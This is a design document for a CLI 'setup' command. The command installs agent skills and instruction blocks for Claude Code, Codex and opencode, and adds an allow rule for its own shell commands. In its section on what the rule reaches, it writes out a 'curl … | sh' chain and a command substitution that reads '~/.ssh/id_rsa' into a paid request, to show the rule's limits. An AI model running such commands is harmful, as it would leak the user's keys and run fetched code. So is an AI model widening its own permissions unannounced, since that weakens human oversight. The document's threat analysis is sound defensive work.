---
autonomy: auto
ci: wait
---

# Setup — design

## What changes

```
src/pixellab_cli/skill/          the packaged skill: SKILL.md and references/
src/pixellab_cli/harness.py      one Harness per target, and what writing one means
commands/setup.py                pixellab-cli setup
```

## The skill has to move house first

The skill lives at `.claude/skills/pixellab-assets/` in this repository, which is not
inside the wheel — so an installed `pixellab` has nothing to install. The files move
to `src/pixellab_cli/skill/` and ship as package data.

That leaves this repository's own `.claude/skills/pixellab-assets/` as a second copy,
and two copies drift. It becomes the output of `pixellab-cli setup --claude` run here, and
`tests/test_skill.py` asserts the installed copy and the packaged one are byte for
byte the same — so drift fails the suite rather than shipping.

## Three harnesses, three shapes

| Harness | Project | Global | Format |
|---|---|---|---|
| Claude Code | `.claude/skills/pixellab-assets/` | `~/.claude/skills/pixellab-assets/` | the skill directory, copied |
| Codex | `AGENTS.md` | `~/.codex/AGENTS.md` | a managed block, plus the references beside it |
| opencode | `AGENTS.md` | `~/.config/opencode/AGENTS.md` | the same block, plus an `instructions` entry in `opencode.json` where that file exists |

Claude Code is the only one of the three with a skill format, which is why the skill
is written in it and the other two get a translation rather than a copy. Codex reads
`AGENTS.md` anywhere in the tree with the nearest winning, and globally from
`$CODEX_HOME`, where it prefers `AGENTS.override.md` and falls back to `AGENTS.md` —
this writes the fallback, because the override is the user's own escape hatch and
taking it would be taking something that is not ours.

Codex and opencode share `AGENTS.md` in a project, so installing both writes one file
once rather than the same block twice.

## A managed block, not a file we own

`AGENTS.md` belongs to the person. What this writes is delimited:

```markdown
<!-- pixellab-cli:begin -->
… the instructions …
<!-- pixellab-cli:end -->
```

Writing means: replace between the markers if they are there, append if they are not,
and touch nothing else (R1.4). That is what makes a second run identical to the first
(R1.5) and what makes uninstalling a matter of deleting a region rather than guessing.

The block is short on purpose. It carries what an agent has to know before it spends
money — dry run first, which commands are Pro Tools, never print a credential — and
points at `.pixellab/skill/` beside it for the rest. The full command list is
reference material, and a harness that inlines every instruction into every prompt
should not be carrying it.

## Claude Code gets the block too, and it names the skill

Installing the skills is not the same as the rules being read: a skill is loaded when
the agent judges it relevant, and the failure that closes is an agent that judged
wrong — the skills on disk, nothing loading them, a character generated and paid for
without any of it. So the same block is written into `CLAUDE.md`, which is read
whether or not anything is judged relevant.

What differs is how that block points at the entry skill. Codex and opencode have no
skill loader and can only be given a path. Claude Code loads a skill **by name, on
demand**, and a path is what stops that: given one, the agent reads that single file —
the skill's text without the loading, and without the references the loader would have
brought in with it. The Claude block therefore names `pixellab-cli-assets` and carries
no file path at all, and `block_body` takes `None` in place of a references directory
to say so.

## Writing where somebody else can choose the path

`AGENTS.md` in a repository that was cloned is a path an attacker picks, and so is
`.claude/skills/pixellab-assets/SKILL.md`. Every write here refuses a symbolic link at
the target and opens with `O_NOFOLLOW` where the platform has it (R1.7) — the rule the
credentials file already had, carried to the files `setup` writes. What a link would
redirect is not a secret but a truncation: the victim's own file replaced with
instructional Markdown.

A skill directory is emptied before it is filled (R1.8). Leaving a file nobody
packaged is leaving instructions an agent will read, and a reinstall that keeps them is
a clean slate that is not one.

A file this edits keeps the line endings it had (R1.9). Rewriting a CRLF file with LF
turns one appended block into a diff of every line somebody else wrote.

## The prompts, and who is left checking

Claude Code asks before a shell command it has no rule for, so an install that stops
there leaves a prompt on every `pixellab-cli` call. Setup merges `Bash(pixellab-cli *)`
into `permissions.allow` in `.claude/settings.json` — the same path in a project and in
the home directory — keeping every rule, hook and section already in the file (R1.11,
R1.4). It creates the file where there is none, which is the one place this differs from
`opencode.json`: writing that would be deciding the project uses opencode, while this
runs only after `.claude/skills/` has been filled.

What the rule removes is a check. The harness prompt was a second pair of eyes on a
command that spends real money, and after this the only refusal left is the tool's own —
no paid route runs without `--yes`. So the rule is not written quietly: the report names
it, says every `pixellab-cli` command now runs unprompted, and says that deleting the
line from `permissions.allow` brings the prompts back (R1.11, R4.1). A settings file
that will not parse is refused rather than replaced, and, like any other failure here,
it is reported with the paths that were written before it (R1.6, R1.10). A global
install writes the rule to `~/.claude/settings.json`, so it is every project rather than
this one — the report names the path it wrote, which is where that shows.

**What the rule reaches, exactly.** Claude Code splits a compound command on `&&`,
`||`, `;`, `|`, `|&`, `&` and newlines, and every subcommand has to match a rule of its
own — so `pixellab-cli sprite "x" && curl … | sh` is *not* carried by this rule, and the
`curl` is prompted for as it would be without it. What the rule does carry is anything
inside the argument, because `*` matches any text: a command substitution in a
description — `pixellab-cli --yes sprite "$(cat ~/.ssh/id_rsa)"` — matches, and this tool
sends its description to a provider. That is the shape of the exposure and it is worth
saying plainly: the rule is a convenience about prompts, not a boundary around what an
argument may contain. No allow rule can be that boundary; a `PreToolUse` hook is the
only mechanism that inspects a command before the rules are consulted.

The read is guarded the same way the write is (R1.7). Every writer here reads the file
before it writes one, so refusing a link only at the write meant the read had already
followed one: a settings file in a cloned repository is a path somebody else chose. The
refusal moved into the reader, which is also where a file too large to be instructions
is turned away, rather than read into memory before anything has been validated.

## What it asks, and what it already knows

Credentials come from four sources already (`adr:0005-read-credentials-from-a-file-as-well-as-the-environment`),
so setup resolves them before it asks anything and reports what it found: a key in
`FAL_KEY` or in a file is named as present with its source and never asked for again
(R2.1, R2.2). Only what is missing is prompted, without echo, into `~/.pixellab.json`
through the same writer `pixellab-cli config set` uses.

Declining is a normal answer (R2.4): someone setting up a machine where the keys live
in CI should still get the skill installed.

## Detection, and why it only ever offers

With no harness named, setup looks for evidence — `.claude/`, `AGENTS.md`,
`opencode.json`, `~/.codex/`, `~/.config/opencode/` — and offers what it found. It
offers rather than decides, because the evidence is weak by nature: an `AGENTS.md` in
a repository says somebody used an agent, not which one.

`--non-interactive` has no one to offer to, so it installs exactly what was named and
refuses to guess (R3.1, R3.2).

## Failure is per harness, and the report comes first

A path that cannot be written is reported and the rest of the run continues (R1.6).
Setting up three harnesses and failing all three because one directory is read-only is
the behaviour this avoids; the report at the end says what landed, what did not, and
what is still missing before anything can be generated (R4.1).

An installation that stopped partway still wrote something, so the paths are collected
as they land rather than returned only on success (R1.10): a run that copied the skill
and then could not write `AGENTS.md` has copied the skill, and a report saying nothing
happened sends somebody looking for a file that is there.

The same reason orders the two halves of the run. A credential that cannot be stored —
a `~/.pixellab.json` that will not parse — is kept rather than raised where it happens,
so the harness report is printed first and the failure sets the exit code afterwards
(R2.5). What is already resolved is also said as it is found rather than only in the
final report: somebody typing a fal key needs to see that their PixelLab token was
found, or the prompt reads as though nothing was (R2.1).
